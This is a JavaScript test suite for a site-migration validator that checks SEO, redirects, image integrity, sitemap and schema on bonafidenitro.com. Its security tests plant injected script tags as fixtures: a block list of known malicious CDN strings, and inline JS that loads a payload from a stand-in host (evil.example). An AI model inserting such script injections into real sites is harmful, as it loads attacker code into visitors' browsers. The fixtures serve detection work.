import zlib from 'node:zlib';
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { makeFixture, t7Manifest, PNG, JPG, page, jsonLd, run, codes, rm, cleanup, storeLinks } from './fixture.mjs';

// Adds rules to the healthy register, replacing any inventory rule with the same source (sources must stay unique).
const putRules = (fx, ...rs) => { fx.redirects = fx.redirects.filter((x) => !rs.some((r) => r.from === x.from)); fx.redirects.push(...rs); };

// Runs `mutate` on a fresh healthy fixture, then asserts the given check:code is detected
// as blocking in strict mode. `invariant` additionally requires that foundation mode also fails.
const detects = (name, mutate, expected, { invariant = true, mode = 'strict' } = {}) =>
  test(`detects: ${name}`, () => {
    const fx = makeFixture();
    try {
      mutate(fx);
      const r = run(fx, mode);
      assert.ok(codes(r).includes(expected), `expected ${expected}, got ${codes(r).join(', ') || 'nothing'}`);
      assert.equal(r.passed, false, 'strict must fail');
      const f = run(fx, 'foundation');
      assert.equal(f.passed, !invariant, `foundation mode passed=${f.passed}, expected ${!invariant}`);
    } finally { cleanup(fx); }
  });

test('healthy fully-migrated fixture passes strict mode with zero findings', () => {
  const fx = makeFixture();
  try {
    const r = run(fx, 'strict');
    assert.deepEqual(r.findings, []);
    assert.ok(r.passed && r.strictWouldPass);
  } finally { cleanup(fx); }
});

// --- T1 / migration-remaining semantics ---
detects('missing protected URL (migration-remaining: blocks strict, reported in foundation)', (fx) => rm(fx, 'about'), 'T1:protected-url-missing', { invariant: false });
detects('unexpected built page not in manifest', (fx) => fx.put('surprise/index.html', page({ p: '/surprise/', title: 'S' })), 'T1:unmanifested-page');
detects('missing 404 page', (fx) => rm(fx, '404.html'), 'T1:no-404-page');
detects('do-not-generate path built (wp-login.php)', (fx) => fx.put('wp-login.php', 'x'), 'T1:do-not-generate-present');
detects('stray non-directory .html file', (fx) => fx.put('foo.html', '<html></html>'), 'T13:stray-html-file');

// --- T3 canonical / indexability ---
detects('cross-canonical', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', canonical: 'https://bonafidenitro.com/products/' })), 'T3:cross-canonical');
detects('wrong canonical (www / http)', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', canonical: 'http://www.bonafidenitro.com/about/' })), 'T3:canonical-wrong');
detects('missing canonical', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', canonical: null })), 'T3:canonical-missing');
detects('canonical without trailing slash', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', canonical: 'https://bonafidenitro.com/about' })), 'T13:canonical-no-trailing-slash');
detects('canonical pointing at a redirecting URL', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', canonical: 'https://bonafidenitro.com/contact/' })), 'T3:canonical-to-redirect');
detects('noindex on an indexable protected page', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', robots: 'noindex' })), 'T3:noindex-on-indexable');
detects('declared-noindex page that is indexable', (fx) => fx.put('privacy-policies/index.html', page({ p: '/privacy-policies/', title: 'Privacy' })), 'T3:missing-noindex');

// --- T4 on-page ---
detects('missing H1', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', h1: null })), 'T4:h1-missing');
detects('multiple H1', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: '<h1>Second</h1>' })), 'T4:h1-multiple');
detects('missing title', (fx) => fx.put('about/index.html', '<html><head><link rel="canonical" href="https://bonafidenitro.com/about/"></head><body><h1>x</h1></body></html>'), 'T4:title-missing');
detects('duplicate title with no exception', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'Home Nitro' })), 'T4:duplicate-title');
detects('cross-pair duplicate title is not excused by pair-scoped exceptions', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'Cold Brew Kegs' })), 'T4:duplicate-title');
detects('title contract violated (titleMustContain)', (fx) => fx.put('products/index.html', page({ p: '/products/', title: 'Shop', h1: 'Nitro Kegs', body: '<p>Nitro Style</p><a href="https://amazon.com/x">a</a>' })), 'T4:title-contract');
detects('H1 contract violated (h1MustContain)', (fx) => fx.put('products/index.html', page({ p: '/products/', title: 'Kegs', h1: 'Shop', body: '<p>Nitro Style</p><a href="https://amazon.com/x">a</a>' })), 'T4:h1-contract');

// --- T5 content + /products/ vs /products-2/ separation ---
detects('mustContainText missing', (fx) => fx.put('products-2/index.html', page({ p: '/products-2/', title: 'Kegs 2', body: '$1 $2' })), 'T5:content-missing');
detects('/products-2/ carries Amazon links (maxAmazonLinks)', (fx) => fx.put('products-2/index.html', page({ p: '/products-2/', title: 'K2', body: `<p>Jittery John's $1 $2</p><a href="https://amazon.com/x">a</a>` })), 'T5:amazon-links-max');
detects('lookalike Amazon link (domain only in a query string) is not counted', (fx) => fx.put('products/index.html', page({ p: '/products/', title: 'Cold Brew Kegs', h1: 'Nitro Kegs', body: `<p>Nitro Style Jittery John's $1 $2</p><a href="https://example.com/?next=amazon.com">a</a>`, canonical: 'https://bonafidenitro.com/products/' })), 'T5:amazon-links-min');
detects('lookalike Amazon host (amazon.attacker.com) is not counted', (fx) => fx.put('products/index.html', page({ p: '/products/', title: 'Cold Brew Kegs', h1: 'Nitro Kegs', body: `<p>Nitro Style Jittery John's $1 $2</p><a href="https://amazon.attacker.com/fake">a</a>`, canonical: 'https://bonafidenitro.com/products/' })), 'T5:amazon-links-min');
detects('lookalike Amazon host (notamazon.com) is not counted', (fx) => fx.put('products/index.html', page({ p: '/products/', title: 'Cold Brew Kegs', h1: 'Nitro Kegs', body: `<p>Nitro Style Jittery John's $1 $2</p><a href="https://notamazon.com/dp/1">a</a>`, canonical: 'https://bonafidenitro.com/products/' })), 'T5:amazon-links-min');
detects('lookalike store link (domain only in a query string) is not counted', (fx) => fx.put('products/index.html', page({ p: '/products/', title: 'Cold Brew Kegs', h1: 'Nitro Kegs', body: `<p>Nitro Style Jittery John's $1 $2</p><a href="https://www.amazon.com/dp/1">a</a><a href="https://example.com/?next=nitrocoffee.store">s</a>`, canonical: 'https://bonafidenitro.com/products/' })), 'T5:store-links-min');
detects('/products/ and /products-2/ rendered identically', (fx) => {
  const html = page({ p: '/products/', title: 'Cold Brew Kegs', h1: 'Nitro Kegs', body: `<p>Nitro Style Jittery John's $1 $2</p><a href="https://amazon.com/x">a</a>`, canonical: 'https://bonafidenitro.com/products/' });
  fx.put('products/index.html', html);
  fx.put('products-2/index.html', html.replace(/\/products\//g, '/products-2/'));
}, 'T5:products-identical');
detects('/products-2/ canonical collapsed onto /products/', (fx) => fx.put('products-2/index.html', page({ p: '/products-2/', title: 'K2', body: `<p>Jittery John's $1 $2</p>`, canonical: 'https://bonafidenitro.com/products/' })), 'T5:products-collapse');
detects('redirect from /products-2/ to /products/', (fx) => fx.redirects.push({ id: 'p2', type: 'exact', from: '/products-2/', to: '/products/', status: 301, state: 'defined' }), 'T5:products-redirect-source');
detects('redirect from /products/', (fx) => fx.redirects.push({ id: 'p1', type: 'exact', from: '/products/', to: '/about/', status: 301, state: 'defined' }), 'T5:products-redirect-source');
detects('wildcard redirect that would swallow /products-2/', (fx) => fx.redirects.push({ id: 'w', type: 'pattern', from: '/products-*', to: '/products/', status: 301, state: 'defined' }), 'T5:products-redirect-source');
detects('redirect targeting /products-2/', (fx) => fx.redirects.push({ id: 'to2', type: 'exact', from: '/old/', to: '/products-2/', status: 301, state: 'defined' }), 'T5:products2-redirect-destination');
detects('internal link to /products-2/', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: '<a href="/products-2/">w</a>' })), 'T8:products2-linked');
detects('internal link to /products-2 (slash-less / absolute)', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: '<a href="https://bonafidenitro.com/products-2">w</a>' })), 'T8:products2-linked');
detects('manifest weakened: /products-2/ dropped from sitemap contract', (fx) => { fx.baseline.urls.find((u) => u.path === '/products-2/').inSitemap = false; }, 'T5:manifest-products2-contract');

// --- T2 redirect register ---
detects('redirect loop', (fx) => fx.redirects.push({ id: 'la', type: 'exact', from: '/a/', to: '/b/', status: 301, state: 'defined' }, { id: 'lb', type: 'exact', from: '/b/', to: '/a/', status: 301, state: 'defined' }), 'T2:loop');
detects('redirect self-loop', (fx) => fx.redirects.push({ id: 'self', type: 'exact', from: '/s/', to: '/s/', status: 301, state: 'defined' }), 'T2:loop');
detects('redirect chain (two hops)', (fx) => fx.redirects.push({ id: 'ch', type: 'exact', from: '/old/', to: '/contact/', status: 301, state: 'defined' }), 'T2:chain');
detects('non-301 redirect', (fx) => { fx.redirects[0].status = 302; }, 'T2:non-301');
detects('defined redirect without destination', (fx) => { fx.redirects[0].to = null; }, 'T2:defined-without-destination');
detects('pending-decision redirect that carries a destination', (fx) => { fx.redirects[2].to = 'https://example.com/'; }, 'T2:pending-with-destination');
detects('pending-decision redirect emitted into .htaccess', (fx) => fx.put('.htaccess', 'Redirect 301 /services/x/ https://example.com/'), 'T2:pending-emitted');
detects('redirect to a URL that is not protected/planned', (fx) => { fx.redirects[0].to = '/nowhere/'; }, 'T2:unknown-destination');
detects('protected 200 URL used as a redirect source', (fx) => fx.redirects.push({ id: 'pp', type: 'exact', from: '/about/', to: '/', status: 301, state: 'defined' }), 'T2:protected-url-redirected');
detects('duplicate redirect source', (fx) => fx.redirects.push({ ...fx.redirects[0], id: 'dup' }), 'T2:duplicate-source');
detects('redirect emitted as HTML meta refresh', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', head: '<meta http-equiv="refresh" content="0; url=/">' })), 'T2:meta-refresh-redirect');
test('detects: redirect register failing schema validation', () => {
  const fx = makeFixture();
  try {
    const r = run(fx, 'foundation', { redirectSchemaError: 'defined redirects need a destination' });
    assert.ok(codes(r).includes('T2:register-schema-invalid') && !r.passed);
  } finally { cleanup(fx); }
});

// --- T7 images ---
detects('referenced /wp-content/uploads/ asset missing', (fx) => rm(fx, 'wp-content'), 'T7:missing-upload');
detects('absolute-URL upload reference missing', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: '<img srcset="https://bonafidenitro.com/wp-content/uploads/2020/02/x.png 1x, /wp-content/uploads/2020/01/hero.jpg 2x">' })), 'T7:missing-upload');
detects('required alliance image missing (binary not supplied)', (fx) => rm(fx, 'wp-content/uploads/2022/05/a-alliance.png'), 'T7:required-image-missing', { invariant: false });
detects('required ranking image missing (binary not supplied)', (fx) => rm(fx, 'wp-content/uploads/2018/06/rank.jpg'), 'T7:required-image-missing', { invariant: false });
detects('required image is empty', (fx) => fx.put('wp-content/uploads/2022/05/a-alliance.png', ''), 'T7:required-image-invalid');
detects('required image is HTML masquerading as PNG', (fx) => fx.put('wp-content/uploads/2022/05/a-alliance.png', '<html>not found</html>'), 'T7:required-image-invalid');
detects('required image is PNG bytes under a .jpg path', (fx) => fx.put('wp-content/uploads/2018/06/rank.jpg', PNG), 'T7:required-image-invalid');
detects('required PNG has valid signature but garbage body', (fx) => fx.put('wp-content/uploads/2022/05/a-alliance.png', Buffer.concat([PNG.subarray(0, 8), Buffer.from('not a png')])), 'T7:required-image-invalid');
detects('required PNG is truncated before IEND', (fx) => fx.put('wp-content/uploads/2022/05/a-alliance.png', PNG.subarray(0, PNG.length - 12)), 'T7:required-image-invalid');
detects('required PNG has trailing bytes after IEND', (fx) => fx.put('wp-content/uploads/2022/05/a-alliance.png', Buffer.concat([PNG, Buffer.from('junk')])), 'T7:required-image-invalid');
detects('required PNG has a corrupted chunk CRC', (fx) => { const b = Buffer.from(PNG); b[20] ^= 0xff; fx.put('wp-content/uploads/2022/05/a-alliance.png', b); }, 'T7:required-image-invalid');
const pngWithIdat = (idat) => { const b = Buffer.from(PNG); const len = 10; const start = b.indexOf('IDAT') - 4; const crcT = (x) => { let c = 0xffffffff; for (const v of x) { c ^= v; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; } return (c ^ 0xffffffff) >>> 0; }; const body = Buffer.concat([Buffer.from('IDAT'), idat]); const l = Buffer.alloc(4); l.writeUInt32BE(idat.length); const c = Buffer.alloc(4); c.writeUInt32BE(crcT(body)); return Buffer.concat([b.subarray(0, start), l, body, c, b.subarray(start + 12 + len)]); };
detects('required PNG has CRC-correct IDAT that is not a zlib stream', (fx) => fx.put('wp-content/uploads/2022/05/a-alliance.png', pngWithIdat(Buffer.from('not zlib!!'))), 'T7:required-image-invalid');
detects('required PNG IDAT inflates to the wrong pixel-data size', (fx) => fx.put('wp-content/uploads/2022/05/a-alliance.png', pngWithIdat(zlib.deflateSync(Buffer.alloc(7)))), 'T7:required-image-invalid');
detects('required PNG uses an invalid scanline filter byte', (fx) => fx.put('wp-content/uploads/2022/05/a-alliance.png', pngWithIdat(zlib.deflateSync(Buffer.from([5, 0])))), 'T7:required-image-invalid');
detects('required interlaced PNG uses an invalid scanline filter byte', (fx) => fx.put('wp-content/uploads/2022/05/a-alliance.png', pngInterlaced(1, 1, Buffer.from([9, 0]))), 'T7:required-image-invalid');
const pngInterlaced = (w, h, raw) => { // 8-bit greyscale Adam7 PNG with the given decoded stream
  const crcT = (x) => { let c = 0xffffffff; for (const v of x) { c ^= v; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; } return (c ^ 0xffffffff) >>> 0; };
  const chunk = (t, d) => { const b = Buffer.concat([Buffer.from(t), d]); const o = Buffer.alloc(4); o.writeUInt32BE(d.length); const c = Buffer.alloc(4); c.writeUInt32BE(crcT(b)); return Buffer.concat([o, b, c]); };
  const ihdr = Buffer.alloc(13); ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4); ihdr[8] = 8; ihdr[9] = 0; ihdr[12] = 1;
  return Buffer.concat([PNG.subarray(0, 8), chunk('IHDR', ihdr), chunk('IDAT', zlib.deflateSync(raw)), chunk('IEND', Buffer.alloc(0))]);
};
const pngIhdr = (depth, color, comp, filt, extra = [], late = []) => { // 1x1 PNG with chosen IHDR encoding fields; `extra` chunks go before IDAT; data is sized for 8-bit greyscale-like [filter, sample]
  const crcT = (x) => { let c = 0xffffffff; for (const v of x) { c ^= v; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; } return (c ^ 0xffffffff) >>> 0; };
  const chunk = (t, d) => { const b = Buffer.concat([Buffer.from(t), d]); const o = Buffer.alloc(4); o.writeUInt32BE(d.length); const c = Buffer.alloc(4); c.writeUInt32BE(crcT(b)); return Buffer.concat([o, b, c]); };
  const ihdr = Buffer.alloc(13); ihdr.writeUInt32BE(1, 0); ihdr.writeUInt32BE(1, 4); ihdr.set([depth, color, comp, filt, 0], 8);
  const samples = { 0: 1, 3: 1 }[color] ?? 1;
  const raw = Buffer.alloc(1 + Math.ceil((samples * depth) / 8));
  return Buffer.concat([PNG.subarray(0, 8), chunk('IHDR', ihdr), ...extra.map(([t, d]) => chunk(t, d)), chunk('IDAT', zlib.deflateSync(raw)), ...late.map(([t, d]) => chunk(t, d)), chunk('IEND', Buffer.alloc(0))]);
};
detects('required PNG has an unknown critical chunk', (fx) => fx.put('wp-content/uploads/2022/05/a-alliance.png', pngIhdr(8, 0, 0, 0, [['ABCD', Buffer.alloc(0)]])), 'T7:required-image-invalid');
test('accepts: PNG with an unknown ancillary chunk', () => {
  const fx = makeFixture();
  try { fx.put('wp-content/uploads/2022/05/a-alliance.png', pngIhdr(8, 0, 0, 0, [['abCD', Buffer.alloc(0)]])); assert.ok(!codes(run(fx, 'foundation')).includes('T7:required-image-invalid')); } finally { cleanup(fx); }
});
detects('required JPEG DQT has an illegal precision/id byte', (fx) => { const b = Buffer.from(JPG); b[b.indexOf(0xdb) + 3] = 0xf4; fx.put('wp-content/uploads/2018/06/rank.jpg', b); }, 'T7:required-image-invalid');
detects('required JPEG DHT code lengths are oversubscribed', (fx) => { const i = JPG.indexOf(0xc4); const seg = Buffer.from([0xff, 0xc4, 0x00, 0x16, 0x00, 0x03, ...new Array(15).fill(0), 0, 1, 2]); fx.put('wp-content/uploads/2018/06/rank.jpg', Buffer.concat([JPG.subarray(0, i - 1), seg, JPG.subarray(i - 1 + 2 + JPG.readUInt16BE(i + 1))])); }, 'T7:required-image-invalid');
detects('alliance minimum weakened together with the declared count', (fx) => { fx.config.imageManifest.images = fx.config.imageManifest.images.filter((i) => i.path !== '/wp-content/uploads/2022/05/f-alliance.png'); fx.config.imageManifest.alliance.requiredCount = 5; }, 'T7:alliance-count');
detects('required JPEG DHT counts exceed its symbols', (fx) => { const b = Buffer.from(JPG); b[b.indexOf(0xc4) + 5] = 2; fx.put('wp-content/uploads/2018/06/rank.jpg', b); }, 'T7:required-image-invalid');
detects('required PNG declares compression method 1', (fx) => fx.put('wp-content/uploads/2022/05/a-alliance.png', pngIhdr(8, 0, 1, 0)), 'T7:required-image-invalid');
detects('required PNG declares filter method 1', (fx) => fx.put('wp-content/uploads/2022/05/a-alliance.png', pngIhdr(8, 0, 0, 1)), 'T7:required-image-invalid');
detects('required greyscale PNG declares illegal bit depth 3', (fx) => fx.put('wp-content/uploads/2022/05/a-alliance.png', pngIhdr(3, 0, 0, 0)), 'T7:required-image-invalid');
detects('required PNG declares colour type 2 with illegal bit depth 4', (fx) => fx.put('wp-content/uploads/2022/05/a-alliance.png', pngIhdr(4, 2, 0, 0)), 'T7:required-image-invalid');
detects('required indexed PNG has no PLTE chunk', (fx) => fx.put('wp-content/uploads/2022/05/a-alliance.png', pngIhdr(8, 3, 0, 0)), 'T7:required-image-invalid');
test('accepts: indexed PNG with a PLTE chunk', () => {
  const fx = makeFixture();
  try { fx.put('wp-content/uploads/2022/05/a-alliance.png', pngIhdr(8, 3, 0, 0, [['PLTE', Buffer.from([0, 0, 0])]])); assert.ok(!codes(run(fx, 'foundation')).includes('T7:required-image-invalid')); } finally { cleanup(fx); }
});
const P = (extra, late, depth = 8) => (fx) => fx.put('wp-content/uploads/2022/05/a-alliance.png', pngIhdr(depth, 3, 0, 0, extra, late));
detects('required indexed PNG places PLTE after IDAT', P([], [['PLTE', Buffer.from([0, 0, 0])]]), 'T7:required-image-invalid');
detects('required indexed PNG has an empty PLTE', P([['PLTE', Buffer.alloc(0)]]), 'T7:required-image-invalid');
detects('required indexed PNG has a PLTE that is not whole RGB triples', P([['PLTE', Buffer.from([0, 0, 0, 0])]]), 'T7:required-image-invalid');
detects('required indexed PNG has more PLTE entries than 2^bitDepth', P([['PLTE', Buffer.alloc(9)]], [], 1), 'T7:required-image-invalid');
detects('required indexed PNG has two PLTE chunks', P([['PLTE', Buffer.from([0, 0, 0])], ['PLTE', Buffer.from([0, 0, 0])]]), 'T7:required-image-invalid');
detects('required greyscale PNG carries a PLTE chunk', (fx) => fx.put('wp-content/uploads/2022/05/a-alliance.png', pngIhdr(8, 0, 0, 0, [['PLTE', Buffer.from([0, 0, 0])]])), 'T7:required-image-invalid');
detects('required interlaced PNG declares large dimensions but inflates to one byte', (fx) => fx.put('wp-content/uploads/2022/05/a-alliance.png', pngInterlaced(64, 64, Buffer.alloc(1))), 'T7:required-image-invalid');
test('accepts: interlaced PNG whose inflated stream matches the Adam7 pass sizes', () => {
  const fx = makeFixture();
  try {
    // 2x2 8-bit grey: pass1 1x1 (2 bytes), pass6 1x1 at (1,0) (2 bytes), pass7 2x1 at row 1 (3 bytes)
    fx.put('wp-content/uploads/2022/05/a-alliance.png', pngInterlaced(2, 2, Buffer.alloc(7)));
    assert.ok(!codes(run(fx, 'foundation')).includes('T7:required-image-invalid'));
  } finally { cleanup(fx); }
});
detects('required JPEG has junk after EOI', (fx) => fx.put('wp-content/uploads/2018/06/rank.jpg', Buffer.concat([JPG, Buffer.from([0xff, 0xd9])])), 'T7:required-image-invalid');
detects('required JPEG has valid signature but garbage body', (fx) => fx.put('wp-content/uploads/2018/06/rank.jpg', Buffer.concat([JPG.subarray(0, 4), Buffer.from('not a jpeg')])), 'T7:required-image-invalid');
const jpgNoSeg = (marker) => { const i = JPG.indexOf(Buffer.from([0xff, marker])); const len = JPG.readUInt16BE(i + 2); return Buffer.concat([JPG.subarray(0, i), JPG.subarray(i + 2 + len)]); };
detects('required JPEG has no quantisation table', (fx) => fx.put('wp-content/uploads/2018/06/rank.jpg', jpgNoSeg(0xdb)), 'T7:required-image-invalid');
detects('required Huffman JPEG has no Huffman table', (fx) => fx.put('wp-content/uploads/2018/06/rank.jpg', jpgNoSeg(0xc4)), 'T7:required-image-invalid');
detects('required JPEG is truncated before EOI', (fx) => fx.put('wp-content/uploads/2018/06/rank.jpg', JPG.subarray(0, JPG.length - 2)), 'T7:required-image-invalid');
detects('required image only present at differently-cased path', (fx) => { rm(fx, 'wp-content/uploads/2022/05/a-alliance.png'); fx.put('wp-content/uploads/2022/05/A-alliance.png', PNG); }, 'T7:required-image-path-case');
detects('manifest dropped to fewer than 6 alliance images', (fx) => { fx.config.imageManifest.images = fx.config.imageManifest.images.filter((i) => i.path !== '/wp-content/uploads/2022/05/f-alliance.png'); }, 'T7:alliance-count');
detects('manifest absent', (fx) => { delete fx.config.imageManifest; }, 'T7:manifest-undeclared');
detects('manifest entry outside /wp-content/uploads/', (fx) => { fx.config.imageManifest.images.push({ path: '/img/x.png', group: 'ranking' }); }, 'T7:manifest-entry-invalid');
detects('manifest duplicate entry', (fx) => { fx.config.imageManifest.images.push({ ...fx.config.imageManifest.images[0] }); }, 'T7:manifest-duplicate');
detects('incomplete ranking list stays a blocking evidence gap', (fx) => { fx.config.imageManifest.rankingList.complete = false; }, 'T7:ranking-list-incomplete', { invariant: false });

// --- T8 / T13 links ---
detects('internal link to a redirecting URL', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: '<a href="/contact/">c</a>' })), 'T8:link-to-redirect');
detects('absolute http:// apex link hits the protocol canonicalisation redirect', (fx) => { putRules(fx, ...canon()); fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: '<a href="http://bonafidenitro.com/pricing/">c</a>' })); }, 'T8:link-to-redirect');
detects('absolute https://www link hits the host canonicalisation redirect', (fx) => { putRules(fx, ...canon()); fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: '<a href="https://www.bonafidenitro.com/pricing/">c</a>' })); }, 'T8:link-to-redirect');
detects('internal link without trailing slash', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: '<a href="/pricing">c</a>' })), 'T13:link-missing-trailing-slash');
detects('broken internal link', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: '<a href="/nope/">c</a>' })), 'T8:broken-internal-link');
detects('internal ?p=<post-id> link is do-not-generate (master plan §7.6)', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: '<a href="/?p=9999">c</a>' })), 'T8:link-to-do-not-generate');
detects('internal link to do-not-generate search URL', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: '<a href="/?s=abc">c</a>' })), 'T8:link-to-do-not-generate');
detects('link to protected page that is not built (migration-remaining)', (fx) => { fx.baseline.urls.push({ path: '/later/', tier: 1, expect: '200', canonical: 'self', indexable: true, inSitemap: false }); fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: '<a href="/later/">c</a>' })); }, 'T8:link-to-unbuilt-page', { invariant: false });
detects('minInternalLinksIn not met', (fx) => { fx.baseline.urls.find((u) => u.path === '/products/').minInternalLinksIn = 5; }, 'T8:inbound-links-min');

// --- T9 sitemap ---
detects('sitemap missing /products-2/', (fx) => fx.put('sitemap.xml', `<?xml version="1.0"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"><url><loc>https://bonafidenitro.com/</loc></url><url><loc>https://bonafidenitro.com/products/</loc></url><url><loc>https://bonafidenitro.com/about/</loc></url></urlset>`), 'T9:sitemap-missing-products-2');
detects('sitemap absent (migration-remaining)', (fx) => rm(fx, 'sitemap.xml'), 'T9:sitemap-absent', { invariant: false });
detects('sitemap not valid XML urlset', (fx) => fx.put('sitemap.xml', '<html>nope</html>'), 'T9:sitemap-invalid');
detects('sitemap lists a noindex URL', (fx) => fx.put('sitemap.xml', `<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">${['/', '/products/', '/products-2/', '/about/', '/privacy-policies/'].map((u) => `<url><loc>https://bonafidenitro.com${u}</loc></url>`).join('')}</urlset>`), 'T9:sitemap-disallowed-url');
detects('sitemap lists a foreign host', (fx) => fx.put('sitemap.xml', `<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"><url><loc>https://example.com/</loc></url></urlset>`), 'T9:sitemap-foreign-url');

// --- T10 robots ---
detects('robots.txt absent (migration-remaining)', (fx) => rm(fx, 'robots.txt'), 'T10:robots-absent', { invariant: false });
detects('robots.txt disallows a protected URL', (fx) => fx.put('robots.txt', 'User-agent: *\nDisallow: /products-2/\nSitemap: https://bonafidenitro.com/sitemap.xml\n'), 'T10:robots-blocks-protected');
detects('robots.txt without sitemap', (fx) => fx.put('robots.txt', 'User-agent: *\nAllow: /\n'), 'T10:robots-no-sitemap');

// --- T11 security ---
for (const s of ['quickdelivr', 'coredelivr', 'mpackage']) {
  detects(`forbidden injected-script string "${s}" in HTML`, (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: `<script src="https://cdn.${s}.com/x.js"></script>` })), 'T11:forbidden-string');
}
detects('forbidden string in a bundled JS asset (case-insensitive)', (fx) => fx.put('_astro/app.js', 'var u="//QuickDelivr.net"'), 'T11:forbidden-string');
detects('forbidden string in a file name', (fx) => fx.put('assets/mpackage.txt', 'x'), 'T11:forbidden-string-in-path');
detects('third-party script host outside the allowlist', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: '<script src="https://evil.example/x.js"></script>' })), 'T11:unexpected-script-host');
test('allowlisted third-party script host is accepted', () => {
  const fx = makeFixture();
  try {
    fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: '<script src="https://www.googletagmanager.com/gtm.js"></script>' }));
    fx.config.allowedScriptHosts = ['www.googletagmanager.com'];
    assert.deepEqual(codes(run(fx)), []);
  } finally { cleanup(fx); }
});

detects('script URL assigned in inline JS to a non-allowlisted host', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: `<script>var s=document.createElement('script');s.src = 'https://evil.example/payload.js';document.head.appendChild(s)</script>` })), 'T11:unexpected-script-host');
detects('script URL assigned in bundled JS to a non-allowlisted host', (fx) => fx.put('_astro/app.js', `var s=document.createElement("script");s.setAttribute("src","//evil.example/p.js")`), 'T11:unexpected-script-host');

// --- T6 schema ---
detects('invalid JSON-LD', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', body: '<script type="application/ld+json">{oops</script>' })), 'T6:jsonld-invalid');
detects('manifest-required JSON-LD type missing', (fx) => { fx.baseline.urls.find((u) => u.path === '/about/').schema = ['Article']; }, 'T6:schema-missing');

const withTypes = (types) => page({ p: '/about/', title: 'About us', body: '', head: jsonLd(types) });
detects('site-wide Organization missing on a page (not declared in manifest)', (fx) => fx.put('about/index.html', withTypes(['WebSite', 'BreadcrumbList'])), 'T6:schema-sitewide-missing');
detects('site-wide WebSite missing on a page (not declared in manifest)', (fx) => fx.put('about/index.html', withTypes(['Organization', 'BreadcrumbList'])), 'T6:schema-sitewide-missing');
detects('BreadcrumbList missing on a page (not declared in manifest)', (fx) => fx.put('about/index.html', withTypes(['Organization', 'WebSite'])), 'T6:schema-page-missing');
detects('no JSON-LD at all on a page', (fx) => fx.put('about/index.html', page({ p: '/about/', title: 'About us', head: '' })), 'T6:schema-page-missing');
test('scaffold page without schema is migration-remaining, not an invariant', () => {
  const fx = makeFixture();
  try {
    fx.put('about/index.html', page({ p: '/about/', title: 'About us', head: '', scaffold: true }));
    const r = run(fx, 'foundation');
    assert.ok(codes(r).includes('T6:schema-page-missing'));
    assert.equal(r.findings.filter((f) => f.check === 'T6' && f.kind === 'invariant').length, 0);
    assert.equal(run(fx, 'strict').passed, false);
  } finally { cleanup(fx); }
});

// --- T9 well-formedness (parser, not regexp) ---
const urls4 = ['/', '/products/', '/products-2/', '/about/'];
const NS = 'xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"';
detects('sitemap omitting every </url> close tag', (fx) => fx.put('sitemap.xml', `<?xml version="1.0"?><urlset ${NS}>${urls4.map((u) => `<url><loc>https://bonafidenitro.com${u}</loc>`).join('')}</urlset>`), 'T9:sitemap-invalid');
detects('sitemap with an unescaped ampersand', (fx) => fx.put('sitemap.xml', `<urlset ${NS}>${urls4.map((u) => `<url><loc>https://bonafidenitro.com${u}</loc></url>`).join('')}<url><loc>https://bonafidenitro.com/a?b=1&c=2</loc></url></urlset>`), 'T9:sitemap-invalid');
detects('sitemap with mismatched tags', (fx) => fx.put('sitemap.xml', `<urlset ${NS}>${urls4.map((u) => `<url><loc>https://bonafidenitro.com${u}</url></loc>`).join('')}</urlset>`), 'T9:sitemap-invalid');
detects('sitemap <url> without <loc>', (fx) => fx.put('sitemap.xml', `<urlset ${NS}>${urls4.map((u) => `<url><loc>https://bonafidenitro.com${u}</loc></url>`).join('')}<url></url></urlset>`), 'T9:sitemap-invalid');
detects('sitemap with trailing junk after root', (fx) => fx.put('sitemap.xml', `<urlset ${NS}>${urls4.map((u) => `<url><loc>https://bonafidenitro.com${u}</loc></url>`).join('')}</urlset><x/>`), 'T9:sitemap-invalid');
test('well-formed sitemap with lastmod, comment and escaped ampersand passes', () => {
  const fx = makeFixture();
  try {
    fx.put('sitemap.xml', `<?xml version="1.0" encoding="UTF-8"?>\n<!-- generated --><urlset ${NS}>${urls4.map((u) => `<url><loc>https://bonafidenitro.com${u}</loc><lastmod>2026-01-01</lastmod></url>`).join('')}</urlset>\n`);
    assert.deepEqual(codes(run(fx)), []);
  } finally { cleanup(fx); }
});

